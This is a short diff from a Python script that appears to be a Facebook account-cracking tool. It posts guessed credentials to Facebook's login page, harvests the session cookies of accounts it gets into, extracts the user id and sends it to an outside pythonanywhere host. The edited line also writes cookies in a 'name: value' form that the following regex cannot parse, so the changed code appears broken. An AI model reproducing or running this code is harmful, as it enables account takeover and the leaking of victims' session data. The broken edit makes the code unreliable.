@@ -1243,7 +1243,7 @@ def m6(idf,pwv):
    lo = session.post('https://www.facebook.com/login/#!/home.php/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    coki=";".join([f"{cookie.name}: {cookie.value}" for cookie in session.cookies])
     user = re.findall('c_user=(.*);xs', coki)[0]
     url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
     reqx = requests.get(url).text
